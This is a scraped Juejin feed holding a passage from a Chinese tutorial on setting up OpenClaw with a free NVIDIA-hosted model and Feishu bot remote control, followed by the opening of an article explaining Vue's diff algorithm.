<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1726ff205ada489786c4e32532be8bdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=Nzkda4e9%2Bkb%2F4TuM2dyRq%2BslsNg%3D" alt="img" loading="lazy"/></p>
<p>AI 助手就会自动识别你的需求，并进入部署引导流程。</p>
<p><strong>整个过程不需要输入任何命令，只需要“点确认”。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57cf262dbd3a4fd8ad24772ef6e9f43a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=Ip2FmqoHbLXrRNblBQqt0wW96l4%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-2">初始化配置向导</h3>
<p>部署完成后需要点击手动运行配置一下向导：</p>
<pre><code class="hljs language-Plain" lang="Plain">openclaw onboard --install-daemon
</code></pre>
<p>下面的现在可以把我的作为参考，详细的也可以看开头1.在 Windows 上部署 Openclaw 位置中有介绍</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36f09e9e47b544d3ac071b6ca1b85668~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=k7MrWP%2BBtzpU1MsdUKP69HV%2BZmk%3D" alt="img" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ac86c0999da42f1b14052fadb2bfa95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=cYJ2Na7YjieYnp19a5y83kZkovU%3D" alt="img" loading="lazy"/></p>
<p>下面就是成功了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b100d5b614a7467286540796d6bc46a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=pc8KuwINUGGvJG8cSSDIW%2FrSowg%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-3">免费白嫖AI模型（包括 kimi-k2.5 等）</h3>
<p>1.注册账号：<a href="https://link.juejin.cn?target=https%3A%2F%2Fbuild.nvidia.com%2F" target="_blank" title="https://build.nvidia.com/" ref="nofollow noopener noreferrer">build.nvidia.com/</a>，建议用谷歌登录即可。</p>
<p>2.左上角点击头像，新建一个API Key。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4284ab240e1c4288a6b2782f3bd6835c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=pTTMlmHzaY%2F5suPoRwdP45%2B9CzA%3D" alt="img" loading="lazy"/></p>
<p>3.再次唤醒AI助手，把下面的API KEY换为你自己的，直接扔给它等待就好了。</p>
<pre><code class="hljs language-Python" lang="Python">帮我打开 ~/.openclaw/openclaw.json文件，在 models 部分增加下面的代码，注意：providers 外面还要加一层 models，如果原来配置有models就加到原来的里面
{
  ... 其他内容不要改
  <span class="hljs-string">"models"</span>: {
   <span class="hljs-string">"providers"</span>:{
        <span class="hljs-string">"英伟达nvidia"</span>: {
            <span class="hljs-string">"baseUrl"</span>: <span class="hljs-string">"https://integrate.api.nvidia.com/v1"</span>,
            <span class="hljs-string">"apiKey"</span>: <span class="hljs-string">"nvapi-HxKN8Zp2-xxxxx-替换成你的 key,
            "</span>api<span class="hljs-string">": "</span>openai-completions<span class="hljs-string">",
            "</span>models<span class="hljs-string">": [
              {
                "</span><span class="hljs-built_in">id</span><span class="hljs-string">": "</span>moonshotai/kimi-k2<span class="hljs-number">.5</span><span class="hljs-string">",
                "</span>name<span class="hljs-string">": "</span>moonshotai/kimi-k2<span class="hljs-number">.5</span><span class="hljs-string">",
                "</span>reasoning<span class="hljs-string">": false,
                "</span><span class="hljs-built_in">input</span><span class="hljs-string">": [
                  "</span>image<span class="hljs-string">",
                  "</span>text<span class="hljs-string">"
                ],
                "</span>cost<span class="hljs-string">": {
                  "</span><span class="hljs-built_in">input</span><span class="hljs-string">": 0,
                  "</span>output<span class="hljs-string">": 0,
                  "</span>cacheRead<span class="hljs-string">": 0,
                  "</span>cacheWrite<span class="hljs-string">": 0
                },
                "</span>contextWindow<span class="hljs-string">": 200000,
                "</span>maxTokens<span class="hljs-string">": 8192
              }
            ]
        }
        ... 其他内容不要改
    }
    ... 其他内容不要改
  }
}
</span></code></pre>
<p>助手直接帮你配置成功</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eeb61cc13f584f3d9627b81627ab2c21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=xakRpVOCGwzGVqP8UJy0GH3o9%2Fg%3D" alt="img" loading="lazy"/></p>
<p>修改模型，输入：<code>openclaw config</code>，修改模型。切记</p>
<p>Model/auth provider 选择  Skip for now</p>
<p>Filter models by provider 中选择你添加的 模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa01190623604aeda89d79b1ffbf1610~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=94BO84Lxt0Qsz%2B5udtMwlQAPNOk%3D" alt="img" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea7544550e274da185f2359b56198afa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=YLjQfukdUrYKrs5aJhm4Sb3XshQ%3D" alt="img" loading="lazy"/></p>
<p>输入<code>openclaw gateway restart</code> 重启网关，再输入 <code>openclaw tui</code> 测试模型，问他是什么模型即可。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e57a9f22227046419c53b9d8a74c2d0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=LKHrLkyavAbR7wsTUG8z%2FkwpIVk%3D" alt="img" loading="lazy"/></p>
<h2 data-id="heading-4">赋予灵魂：接入飞书实现远程操控</h2>
<p>在本地运行虽然好，但我们不可能永远守在电脑前。接入飞书（Lark），就能让你在手机上随时随地给家里的电脑下达指令。</p>
<p>1.打开飞书开放平台配置：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopen.feishu.cn%2Fapp" target="_blank" title="https://open.feishu.cn/app" ref="nofollow noopener noreferrer">open.feishu.cn/app</a>，新建一个，输入相关信息。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0431793bbff643b28b1010e302e9b31f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=Qx6aZTSTA5MbL%2BihJEzWWMd%2F5dQ%3D" alt="img" loading="lazy"/></p>
<p>2.获取到：App ID和App Secret</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5f1f0df483840f0b3f6436f050e43e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=KHHR%2F3VE4jVFn31XpaFQ9%2FenayA%3D" alt="img" loading="lazy"/></p>
<p>3.在添加应用能力里选择机器人并添加。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ea2789aa62e4f12a4968484e8b0a49d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=lK3YWL3kkl4ykg%2B%2FRGLPgjafvlU%3D" alt="img" loading="lazy"/></p>
<p>4.给机器人开通全部的权限。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b2520fe8618432c97c95b807044b25f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=i1rhGIp4zquJtFGAS74m8alAh8Y%3D" alt="img" loading="lazy"/></p>
<p>4.接下来就是下载插件使飞书和 Openclaw 连接。</p>
<pre><code class="hljs language-Plain" lang="Plain">openclaw plugins inatall @m1heng-clawd/feishu
安装插件：飞书插件 - 支持飞书通道，并且配置好

openclaw config set channels.feishu.appId "cli_xxxxx"
openclaw config set channels.feishu.appSecret "your_app_secret"
openclaw config set channels.feishu.enabled true


我的飞书信息：
App ID：换为你自己在步骤2得到的
App Secret：换为你自己在步骤2得到的

openclaw gateway restart
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38b8f851a5dc4597ad5d5b977eaddae0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=UDIfcNNL9yWknmO5SxhAsNfk80o%3D" alt="img" loading="lazy"/></p>
<p>如果它还是没配置好，那就单独让它配置一下就好了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60dd7dca97e74b9e84583bcce9032ec4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=lfNre70CrA85oSu7fSRIV494itY%3D" alt="img" loading="lazy"/></p>
<p>5.接下来就是在<strong>事件与**</strong>回调****（二者缺一不可）**中选择长连接即可（如果没有成功，可能需要上一步重启 Openclaw Gateway 服务）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bef366f3894b457d84de393444a7bdd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=42Of8YVYztwnQr%2FQSCozxf8fGPA%3D" alt="img" loading="lazy"/></p>
<p>然后在添加事件中全部勾选即可。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/364e3fb19fed4108829a2237769bb089~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=381eUjecKnTQq7gbSihVobCZITM%3D" alt="img" loading="lazy"/></p>
<p>6.最后就是插件一个版本进行发布即可，点击左侧“版本管理与发布” -&gt; 创建版本 -&gt; 申请发布。。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21e391d4145d4c388f306218723671e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=YwLAyT1f24a%2BSFmypEBqnhhNsz8%3D" alt="img" loading="lazy"/></p>
<p>打开飞书</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c17e3d4af5c246549ea365f3f03931cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=DSYs3dx70tGcR84dV%2Fu83wWu%2F9k%3D" alt="img" loading="lazy"/></p>
<h2 data-id="heading-5">总结与建议</h2>
<p>写在最后，我对这套 <strong>OpenClaw + 腾讯云 + NVIDIA +</strong> <strong>飞书</strong> 的技术栈做一个客观的总结。</p>
<p><strong>瑕不掩瑜，强烈推荐！</strong></p>
<p>对于手里有闲置服务器（尤其是腾讯云轻量应用服务器）的朋友来说，这几乎是<strong>性价比最高</strong>的玩法。它不仅能让你熟悉 Linux、API 调试、IM 机器人开发等全套技术栈，还能给你提供一个实实在在的生产力工具。</p>
<p>别让你的服务器再“吃灰”了，现在就动手，把它变成你的赛博伙伴吧！</p>
<h2 data-id="heading-6">ending</h2>
<p>我创建了一个读者 <strong>AI 极客交流及搞钱群</strong>，群里都是一群前沿的 AI 极客，经常讨论最新的 AI 消息，用法，以及变现方法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34b157f303214483bb9421a0aa8fa5cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730087&amp;x-signature=ogfXlG0QfdBQoB120pz%2Blm7FHrA%3D" alt="img" loading="lazy"/></p>
<p>但是任何人在群里打任何广告，都会被我 T 掉。</p>
<p>如果你对这个特别的群，感兴趣，可以公众号后台私信我加入。</p>
<p>暗号：<strong>AI</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue-深入浅出Vue Diff 算法]]></title>    <link>https://juejin.cn/post/7602488966609829926</link>    <guid>https://juejin.cn/post/7602488966609829926</guid>    <pubDate>2026-02-03T13:35:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488966609829926" data-draft-id="7602464510607343642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue-深入浅出Vue Diff 算法"/> <meta itemprop="keywords" content="前端,Vue.js,面试"/> <meta itemprop="datePublished" content="2026-02-03T13:35:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="发现一只大呆瓜"/> <meta itemprop="url" content="https://juejin.cn/user/180747382561607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue-深入浅出Vue Diff 算法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180747382561607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    发现一只大呆瓜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:35:52.000Z" title="Tue Feb 03 2026 13:35:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>在 Vue 的响应式系统中，当数据发生变化时，Vue 会生成一颗新的虚拟 DOM 树（VNode Tree）。Diff 算法的核心任务就是通过对比新旧两棵树，以<strong>最小的性能代价</strong>完成真实 DOM 的更新。本文将带你深度拆解 Vue Diff 的核心机制。</p>
<h2 data-id="heading-1">一、 Diff 算法的核心策略</h2>
<p>Vue 的 Diff算法就是比较dom树的新旧节点，一边比较一边给真实dom移动、插入或者删除节点。Diff 算法基于两个基本假设，从而将时间复杂度从 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 降低到了 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span>：</p>
<ol>
<li>
<p><strong>同层比较</strong>：算法只会对同一层级的节点进行比较，不会跨层级操作。</p>
</li>
<li>
<p><strong>深度优先</strong>：通过递归的方式，先处理子节点，再处理父节点。</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-2">二、 三大核心函数解析</h2>
<p>Diff 的过程主要由 <code>patch</code>、<code>patchVnode</code> 和 <code>updateChildren</code> 三个函数协同完成。</p>
<h3 data-id="heading-3">1. patch 函数：同层比对的入口</h3>
<p>这是 Diff 的起点，它负责决定是直接替换整个节点，还是深入比对，比较策略如下:</p>
<ul>
<li><strong>如果新节点不存在</strong>：直接删除旧节点。</li>
<li><strong>如果新节点存在，旧节点不存在</strong>：直接新建并插入节点。</li>
<li><strong>如果两个节点都存在，但节点类型不同</strong>：认为节点已改变，销毁旧的，创建新的。</li>
<li><strong>如果两个节点都存在，且节点类型相同</strong>：则调用 <code>patchVnode</code> 继续比对</li>
<li>。</li>
</ul>
<h3 data-id="heading-4">2. patchVnode 函数：属性与文本的更新</h3>
<p>当确定两个节点“值得比较”时，执行以下逻辑：</p>
<ul>
<li>
<p><strong>首先判断新节点是否为文本节点</strong>（为文本节点就说明没有子节点了），如果是的话，则直接更新dom的文本内容为新节点的文本内容。</p>
</li>
<li>
<p><strong>如果新节点不是文本节点，而旧节点是文本节点的话</strong>，说明节都是全新的，所以直接将新节点添加到父节点中</p>
</li>
<li>
<p><strong>如果新旧节点都不是文本节点</strong>，则说明两者都有子节点，接下来就进<code>updateChildren()</code>函数进行下一步比较并更新子节点</p>
</li>
</ul>
<h3 data-id="heading-5">3. updateChildren 函数：双端比较算法</h3>
<p>这是 Vue Diff 的灵魂。它通过 <strong>“双端指针”</strong> （新头、新尾、旧头、旧尾）向中间靠拢，寻找可复用的节点。<code>updateChildren</code>函数对会新旧两个节点设置4个指针，分别指向<strong>新头、旧头、新尾、旧尾</strong>，它主要对5种情况进行比较：</p>
<p><strong>比较的五种优先级：</strong></p>
<ol>
<li>
<p><strong>首先是旧头新头进行比较</strong>：如果二者相同，就对二者执行<code>patchVnode()</code>，并将旧头新头两个指针向中间移动。</p>
</li>
<li>
<p><strong>如果旧头新头不相同，就进行旧尾新尾的比较</strong>：如果旧尾新尾相同的话，则将旧尾新尾两指针向中间移动。</p>
</li>
<li>
<p><strong>如果旧头与新头，旧尾与新尾都不相同</strong>：那就进行交叉比较，比较方式如下：</p>
<ul>
<li>首先是<code>旧头新尾</code>比较，如果二者相同，那么就执行<code>patchVnode()</code>，并将<code>旧头</code>指针向后移一位，<code>新尾</code>指针前移一位</li>
<li>如果<code>旧头新尾</code>不相同，那就比较<code>新头旧尾</code>，如果二者相同，那么就执行<code>patchVnode()</code>，并将<code>新头</code>指针后移一位，<code>旧尾</code>指针前移一位</li>
</ul>
</li>
<li>
<p><strong>如果以上四种情形都不满足的话，那说明没有相同的节点可以复用，则将在旧节点中遍历寻找与新头节点<code>key</code>值相同的节点</strong>。</p>
<ul>
<li>如果没有在旧节点中找到<code>key</code>值相同的节点，则说明新头节点是一个新的节点，那么就直接新建，并将新头指针后移</li>
<li>如果在旧节点中找到了<code>key</code>值相同的节点，则执行<code>patchVnode()</code>函数继续比较对应key值相同的节点是否为同一节点，并将新头指针后移</li>
</ul>
</li>
</ol>
<h2 data-id="heading-6">三、 案例实战：双端比对全过程</h2>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec83030ce1a4cf0a180fa9831cb19b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R546w5LiA5Y-q5aSn5ZGG55Oc:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730552&amp;x-signature=9hsqO%2BQujd1tCY9DCIbT7MHwiic%3D" alt="image.png" loading="lazy"/></p>
<p>第一次循环后，发现旧头新尾、旧头新头不相同，但旧尾新头相同，直接复用旧节点D作为diff后的第一个真实节点，同时旧节点<code>endIndex</code>移动到C，新节点的 <code>startIndex</code> 移动到了 C。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/badf80934baf489e936512fcc13fa46f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R546w5LiA5Y-q5aSn5ZGG55Oc:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730552&amp;x-signature=12EtkYLn9HC6vz0kMn5C9yk6hF0%3D" alt="image.png" loading="lazy"/></p>
<p>二次循环后，同样是旧尾新头相同，这时就将diff 后创建的真实节点 C 插入到第一次创建的 D 节点后面。同时旧节点的 <code>endIndex</code> 移动到了 B，新节点的 <code>startIndex</code> 移动到了 E。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3cad57541253446d8cc24bc9b3587f9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R546w5LiA5Y-q5aSn5ZGG55Oc:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730552&amp;x-signature=8K6arhQ%2BJG97Ds6WZFty9hvyvhk%3D" alt="image.png" loading="lazy"/>
第三次循环中，发现在旧节点中没有找到E节点，这时候直接创建新的真实节点 E，插入到第二次创建的 C 节点之后。同时新节点的 <code>startIndex</code> 移动到了 A。<code>旧节点startIndex</code> 和 endIndex 都保持不动。</p>
